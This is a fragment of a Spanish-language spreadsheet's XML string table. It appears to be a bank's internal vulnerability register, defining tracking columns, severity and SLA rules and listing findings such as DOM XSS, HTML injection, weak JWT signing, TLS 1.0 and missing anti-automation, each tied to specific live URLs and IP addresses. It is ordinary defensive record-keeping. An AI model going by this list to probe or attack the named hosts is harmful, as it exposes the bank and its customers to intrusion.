      <t>,</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> BitSight</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> SecurityScorecard</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> ASM-Pentesting</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t>D</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Tipo de activo en la que se reporta la vulnerabilidad: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Infraestructura</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Web App.</t>
    </r>
  </si>
  <si>
    <t>E</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Codigo de Waiver es el codigo o número que se asigana cuando la vulnerabilidad supera el SLA y su solucion requiere un plazo superior, entonces se requiere firmar una excepción.
Esta categoria es para radicar los waiver: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>CATALOGO TECNICO &gt; Cybersecurity &gt; Audit &amp; Compliance &gt; GRC Compliance - Non-Compliance Cyber Requirements Renewals (Waivers/Exception)</t>
    </r>
  </si>
  <si>
    <t>F</t>
  </si>
  <si>
    <t>Código de Waiver anterior.</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>Nombre del activo vulnerable.</t>
  </si>
  <si>
    <t>H</t>
  </si>
  <si>
    <t>Codigo de identificacion, depende de la fuente que reporta la vulnerabilidad.</t>
  </si>
  <si>
    <t>I</t>
  </si>
  <si>
    <t>Codigo de identificación del proveedor, depende de la fuente que reporta la vulnerabilidad.</t>
  </si>
  <si>
    <t>J</t>
  </si>
  <si>
    <t>Descripcion de la vulnerabilidad detectada.</t>
  </si>
  <si>
    <t>K</t>
  </si>
  <si>
    <t>Categoria de enumeración de debilidad común, es una lista desarrollada por la comunidad de debilidades comunes de seguridad de software y hardware.</t>
  </si>
  <si>
    <t>L</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Estado en la que se encuentra actulmente la vulnerabilidad registrada: 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Active: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>La vulnerabilidad esta abierta.</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Assumed: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>La vulnerabilidad esta asumida y cuenta con un Waiver.</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Solved: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Vulnerabilidad remediada.</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Dismissed: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>La vulnerabilidad es un falso positivo o el activo fue dado de baja.</t>
    </r>
  </si>
  <si>
    <t>M</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Nivel de criticidad: 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">EMERGENCY: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Vulnerabilidades declaradas por la Organización Global CISO como riesgo destacado para el Grupo. Los eCISOs también pueden declarar vulnerabilidades de emergencia en sus filiales después de analizar la criticidad y la información sobre riesgos y amenazas.</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
CRITICAL: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Potencial grave por daños colaterales en los sistemas o datos internos. Bien proliferado. Requiere poco esfuerzo para su explotación. Vulnerabilidades cuya explotación podría permitir la ejecución del código sin la interacción del usuario, incluido el malware de auto propagación (ej.: gusanos de red).
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">HIGH: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Alto potencial de daños colaterales a los sistemas o datos internos.</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
MEDIUM: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Potencial moderado a grave de daños colaterales en los sistemas o datos internos. Requiere un esfuerzo moderado de para su explotación. Proliferación de moderada a leve.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">LOW: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Parches recomendados por el proveedor. Potencial menor o nulo de daños colaterales a los sistemas o datos internos. Requiere un esfuerzo considerable para su explotación.</t>
    </r>
  </si>
  <si>
    <t>N</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">
Sistema de puntuación de vulnerabilidad común 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Emergency: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Cualquiera</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Critical:</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> 9.0 &lt;= CVSS &lt; 10.0</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
High: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>7.0 &lt;= CVSS &lt; 9.0</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Medium: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>4.0 &lt;= CVSS &lt; 7.0</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Low: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>0.0 &lt;= CVSS &lt; 4.0
Severidad del vendedor.</t>
    </r>
  </si>
  <si>
    <t>O</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Codigo de vulnerabilidades y exposiciones comunes: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>CVE.</t>
    </r>
  </si>
  <si>
    <t>P</t>
  </si>
  <si>
    <t>Diereccion IP del activo que registra la vulnerabilidad.</t>
  </si>
  <si>
    <t>Q</t>
  </si>
  <si>
    <t>Nombre del Host que registra la vulnerabilidad.</t>
  </si>
  <si>
    <t>R</t>
  </si>
  <si>
    <t>Puerto.</t>
  </si>
  <si>
    <t>S</t>
  </si>
  <si>
    <t>Tipo de puerto.</t>
  </si>
  <si>
    <t>T</t>
  </si>
  <si>
    <t>Fecha en la que se reporto al área responsable de atender la vulnerabilidad.</t>
  </si>
  <si>
    <t>U</t>
  </si>
  <si>
    <t>Días que lleva activa.</t>
  </si>
  <si>
    <t>V</t>
  </si>
  <si>
    <t xml:space="preserve">
Expiration day according to SLA</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Fecha final de remediación basado en el SLA:
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Emergencia: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Inmediatamente, no más de 10 días</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Critica: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>10 días</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Altas: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>30 días</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Medio: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>90 días</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Bajo: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Riesgo aceptado</t>
    </r>
  </si>
  <si>
    <t>W</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Estado del SLA 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">EN SLA: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>La vulnerabilidad se encuentra dentro de los tiempos establecidos de atención.</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color rgb="FFFF0000"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
SLA Vencido: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>La vulnerabilidad supera el SLA de atención establecido.</t>
    </r>
  </si>
  <si>
    <t>X</t>
  </si>
  <si>
    <t>La vulnerabilidad cuenta con un Waiver.</t>
  </si>
  <si>
    <t>Y</t>
  </si>
  <si>
    <t>Fecha de la solicitud de Waiver.</t>
  </si>
  <si>
    <t>Z</t>
  </si>
  <si>
    <t>Fecha de finalización del Waiver.</t>
  </si>
  <si>
    <t>AA</t>
  </si>
  <si>
    <t xml:space="preserve">
Remediation Date</t>
  </si>
  <si>
    <t>Fecha en la que se remedio la vulnerabilidad.</t>
  </si>
  <si>
    <t>AB</t>
  </si>
  <si>
    <t>Detalle de la vulnerabilidad presentada en el activo.</t>
  </si>
  <si>
    <t>AC</t>
  </si>
  <si>
    <t>Recomendaciones.</t>
  </si>
  <si>
    <t>AD</t>
  </si>
  <si>
    <t>Detalle del riesgo que implica la vulnerabilidad detectada.</t>
  </si>
  <si>
    <t>AE</t>
  </si>
  <si>
    <t>Fecha de atención confirmada por los gestores o el equipo de desarrollo para remediar la vulnerabilidad.</t>
  </si>
  <si>
    <t>AF</t>
  </si>
  <si>
    <t>Comentarios adicionales.</t>
  </si>
  <si>
    <t>AG</t>
  </si>
  <si>
    <t>Responsable tecnico del servicio.</t>
  </si>
  <si>
    <t>LYNX</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-014-AP-001</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-014-AP-002</t>
  </si>
  <si>
    <t>Acceso no autorizado a operativas</t>
  </si>
  <si>
    <t>Es posible acceder o modificar contenido restringido o no autorizado al usuario. Permitiendo el 
acceso o la modificación de información potencialmente sensible con diferentes niveles de 
confidencialidad, dependiendo de la naturaleza de la información expuesta.</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario y/o roles para 
acceder a cualquier tipo de funcionalidad de la aplicación. Además, se recomienda comprobar, 
siempre en el lado del servidor, que el usuario que solicita el acceso dispone de privilegios de 
acceso a la funcionalidad solicitada.</t>
  </si>
  <si>
    <t>Un usuario malintencionado puede acceder a funcionalidades a las que no debería tener acceso o 
que no se encuentran directamente enlazadas en la aplicación.</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que las cabeceras HTTP de respuesta del 
servidor revelan información interna acerca del tipo de servidor y versión del mismo a través de la 
cabecera "Server" a través de la dirección URL https://181.57.221.233/lynx/api/v2</t>
  </si>
  <si>
    <t>Jonathan Flores</t>
  </si>
  <si>
    <t>21/09/2025
20/02/2026</t>
  </si>
  <si>
    <t>MAN-6989ec5d6d73db47900aceb1</t>
  </si>
  <si>
    <t>MAN-6989ee326d73db47900ad24f</t>
  </si>
  <si>
    <t>QA-WAS-1c220678-9a29-4386-b5b9-67996bd296e4</t>
  </si>
  <si>
    <t>QA-WAS-b283bf25-ea1e-4c8c-988f-0bf81771f140</t>
  </si>
  <si>
    <t>QA-WAS-0a8a69c4-fb03-43ea-81c9-c38ed758c0b0</t>
  </si>
  <si>
    <t>QA-WAS-12f4437f-0b2a-4d01-82bf-c6784f7dd3a0</t>
  </si>
  <si>
    <t>QA-WAS-6b4218dc-859a-4f96-b26c-ffc9ea6f4f97</t>
  </si>
  <si>
    <t>QA-WAS-dbc8a6e0-8250-46af-864d-11171f4ab54b</t>
  </si>
  <si>
    <t>QA-WAS-de147cb4-3a04-4943-b816-2fcb103620a9</t>
  </si>
  <si>
    <t>JWT token in Response Headers uses symmetric algorithm.</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/auth/ApiContract/contract/1e2bb0fc-eebe-41d1-bff4-aff977a97516</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/auth/ApiContract/contract/b4a93885-fc9b-4282-a732-23b8f0a6f54f</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/auth/ApiContract/rubros?codigoProducto=RI&amp;orderName=0</t>
  </si>
  <si>
    <t>During the WAS scan , it was observed that JWT token is used in Authorization header contains symmetric algorithm.</t>
  </si>
  <si>
    <t>JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). 
Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value.</t>
  </si>
  <si>
    <t>Review the JWT token set in Authorization header to use only one selected signature algorithm.</t>
  </si>
  <si>
    <t>API Notificaciones</t>
  </si>
  <si>
    <t>Inyección HTML</t>
  </si>
  <si>
    <t>Cross Site Scripting Basado en DOM</t>
  </si>
  <si>
    <t xml:space="preserve"> https://notificaciones.api.santander.com.co</t>
  </si>
  <si>
    <t>SCO-26-CNMPO-001-AP-001</t>
  </si>
  <si>
    <t>SCO-26-CNMPO-001-AP-002</t>
  </si>
  <si>
    <t>SCO-26-CNMPO-001-AP-003</t>
  </si>
  <si>
    <t>SCO-26-CNMPO-001-AP-004</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Se recomienda que la aplicación devuelva errores genéricos independientemente de la causa que haya producido el error.</t>
  </si>
  <si>
    <t>La inyección de HTML es un tipo de vulnerabilidad de inyección, que se produce cuando un usuario puede controlar un punto de entrada e inyectar código HTML arbitrario en una página web vulnerable.</t>
  </si>
  <si>
    <t>Mediante la presente vulnerabilidad, y la inyección de código que supone, sería posible para un atacante generar direcciones URLs maliciosos para realizar las siguientes acciones: • Robo de sesiones: Acceder al identificador de sesión del usuario, almacenado en forma de cookie. Phising: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible. • Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar vulnerabilidades del navegador, de los conectores del mismo o del sistema operativo de lavíctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer
totalmente el sistema de la víctima.
• Ejecución de acciones de forma "transparente" para el usuario: Interactuar con la aplicación
y realizar acciones sin el conocimiento del usuario</t>
  </si>
  <si>
    <t>Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por los usuarios, de forma que se valide adecuadamente la información transmitida a través de los mismos. Existen dos estrategias generales para implantar este filtro: • Filtrado de lista blanca: Se valida la información recibida en función de la información esperada. • Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código JavaScript. Esta lista de caracteres podría ser “’”, “”, “)”, “(“, “”” y la cadena “script”. De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga una complejidad alta, se recomienda utilizar una estrategia basada en listas negras. Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que el navegador del usuario interprete código JavaScript debido a una inyección de código, una posibilidad sería renderizar caracteres especiales como HTML Entities: • (") sería " • (') sería &amp;apos • () sería &gt;</t>
  </si>
  <si>
    <t>XSS Basada en el DOM es un tipo de vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inyectar y ejecutar código malicioso en el navegador web de un usuario. A diferencia de otras formas de XSS, como XSS almacenada o reflejada, la XSS Basada en el DOM se enfoca en la manipulación del Modelo de Objetos del Documento (DOM) del navegador web, en lugar de interactuar con el servidor web</t>
  </si>
  <si>
    <t>El impacto de un ataque de XSS Basada en el DOM puede ser significativo, ya que el código malicioso se ejecuta dentro del contexto del sitio web legítimo y puede acceder a información sensible, robar sesiones de usuario, redirigir a sitios maliciosos o realizar otras acciones perjudiciales en nombre del usuario afectado.</t>
  </si>
  <si>
    <t>Para prevenir la XSS Basada en el DOM, es esencial que los desarrolladores web implementen prácticas de seguridad sólidas, como la validación de entrada en el lado del servidor y la codificación adecuada de la salida. También es crucial comprender cómo las aplicaciones manipulan el DOM y cómo los datos del cliente pueden influir en él para garantizar una defensa efectiva contra esta vulnerabilidad.</t>
  </si>
  <si>
    <t>La ausencia de las cabeceras cache-control y pragma HTTP permite que el navegador y los proxies almacenen el contenido en la memoria caché. Independientemente de la política de caché definida por la aplicación web</t>
  </si>
  <si>
    <t>Las aplicaciones deben devolver las directivas de almacenamiento en caché indicando a los navegadores que no almacenen copias locales de ningún dato sensible. A menudo, esto se puede lograr mediante la configuración del servidor web para evitar el almacenamiento en caché de rutas relevantes o cualquier otra información sensible. Alternativamente, la mayoría de las plataformas de desarrollo web, permiten controlar las directivas de almacenamiento en caché del servidor desde scripts individuales. Se recomienda que el servidor web devuelva las siguientes cabeceras HTTP en todas las respuestas que contengan contenido sensible: • Cache-control: no-store • Pragma: no-cache</t>
  </si>
  <si>
    <t>Cesar Augusto Puentes</t>
  </si>
  <si>
    <t xml:space="preserve">SCO-25-CNMPA-008-CO-002 </t>
  </si>
  <si>
    <t xml:space="preserve">SCO-25-CNMPA-008-VE-001 </t>
  </si>
  <si>
    <t>Hubspot</t>
  </si>
  <si>
    <t>QA-WAS-aea0a6c3-c7c3-400c-9612-e6ff385ca856</t>
  </si>
  <si>
    <t>QA-WAS-9a81b71d-50d7-400c-8bd1-c61f8f8be959</t>
  </si>
  <si>
    <t>QA-WAS-8e7c44b2-0bd0-4228-805b-58bdde3cc09e</t>
  </si>
  <si>
    <t>QA-WAS-523f33c4-1b5f-4a5d-b4e1-2587ce6cf153</t>
  </si>
  <si>
    <t>QA-VM--5255039487965443251</t>
  </si>
  <si>
    <t>QA-VM-2608568286331767773</t>
  </si>
  <si>
    <t>QA-VM--3134702355103034807</t>
  </si>
  <si>
    <t>QA-VM-5838260970963253057</t>
  </si>
  <si>
    <t>QA-VM--9049177468578007296</t>
  </si>
  <si>
    <t>TLS is capable of using a multitude of ciphers (algorithms) to create the public and private key pairs.
For example if TLSv1.0 uses either the RC4 stream cipher, or a block cipher in CBC mode.
RC4 is known to have biases and the block cipher in CBC mode is vulnerable to the POODLE attack.
TLSv1.0, if configured to use the same cipher suites as SSLv3, includes a means by which a TLS implementation can downgrade the connection to SSL v3.0, thus weakening security.
A POODLE-type attack could also be launched directly at TLS without negotiating a downgrade.
 This QID is an automatic PCI FAIL in accordance with the PCI standards. 
Further details can be found under: 
PCI: ASV Program Guide v3.1 (page 27)
PCI: Use of SSL Early TLS and ASV Scans</t>
  </si>
  <si>
    <t>http://api-auto.hubapi.com/</t>
  </si>
  <si>
    <t>http://edge-kv.hubapi.com/</t>
  </si>
  <si>
    <t>http://edge-kv-na1.hubapi.com/</t>
  </si>
  <si>
    <t>http://feedback.hubapi.com/</t>
  </si>
  <si>
    <t>mx.hubapi.com</t>
  </si>
  <si>
    <t>smtp.hubapi.com</t>
  </si>
  <si>
    <t>Disable the use of TLSv1.0 protocol in favor of a cryptographically stronger protocol such as TLSv1.2.
The following openssl commands can be used to do a manual test:
openssl s_client -connect ip:port -tls1
If the test is successful, then the target support TLSv1</t>
  </si>
  <si>
    <t>Breb</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-AP-001</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-002</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-003</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-004</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-005</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-006</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-007</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-008</t>
  </si>
  <si>
    <t>SCBD-2025-CNMPO-013-CO-009</t>
  </si>
  <si>
    <t>Ausencia de mecanismo anti automatización</t>
  </si>
  <si>
    <t>http://186.190.254.106:443/api/Consultar-DetalleCliente</t>
  </si>
  <si>
    <t>Se ha detectado una falta de medidas o controles para detectar y mitigar los intentos de automati_x0002_zación maliciosa en el activo. La automatización maliciosa se refiere al uso de herramientas automa_x0002_tizadas o scripts para llevar a cabo actividades fraudulentas, como el envío masivo de solicitudes o 
ataques de fuerza bruta.
La ausencia de dichos mecanismos ha permitido realizar una enumeración proporcionando distintos 
identificadores.</t>
  </si>
  <si>
    <t>La ausencia de un mecanismo anti-automatización puede tener los siguientes impactos negativos en 
la seguridad:
Sin un mecanismo para detectar y bloquear los intentos de fuerza bruta, un atacante puede realizar 
una gran cantidad de intentos de inicio de sesión o de adivinación de contraseñas sin restricciones. 
Esto aumenta las posibilidades de que un atacante pueda acceder ilegalmente a cuentas de usuario 
o a recursos protegidos.
Los ataques automatizados pueden generar una alta carga en el sistema, consumiendo recursos 
como ancho de banda, capacidad de procesamiento y memoria. Esto puede llevar a una degradación 
del rendimiento y, en casos extremos, a la indisponibilidad del sistema para los usuarios legítimosz</t>
  </si>
  <si>
    <t>e recomienda implementar medidas para evitar que ningún mecanismo automático pueda reali_x0002_zar el proceso de autenticación en la aplicación, como por ejemplo un sistema reCAPTCHA, que 
consiste en una prueba de desafío-respuesta utilizada en computación para determinar cuándo un 
usuario es o no humano.</t>
  </si>
  <si>
    <t>http://186.190.254.106:443/api/NotificarProcesoLlave</t>
  </si>
  <si>
    <t>http://186.190.254.106:443/api/ConsultarDetalleCliente</t>
  </si>
  <si>
    <t>http://186.190.254.106:443/api/ConfirmarAbono</t>
  </si>
  <si>
    <t>http://186.190.254.106:443/api/InstruccionAbono</t>
  </si>
  <si>
    <t>La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una 
vulnerabilidad de tipo "Cross Site Scripting" explotar la vulnerabilidad sin encontrarse ningún sis_x0002_tema de protección que mitigue su impacto. 
El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies 
y demás información sensible que un cliente pueda estar transmitiendo al sitio web.</t>
  </si>
  <si>
    <t xml:space="preserve">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"Content-Security-Po_x0002_licy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata 
de una versión antigua y no es necesario configurarla). </t>
  </si>
  <si>
    <t>La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante 
la sesión. 
El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, em_x0002_pleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la informa_x0002_ción se envía a través de un canal seguro. 
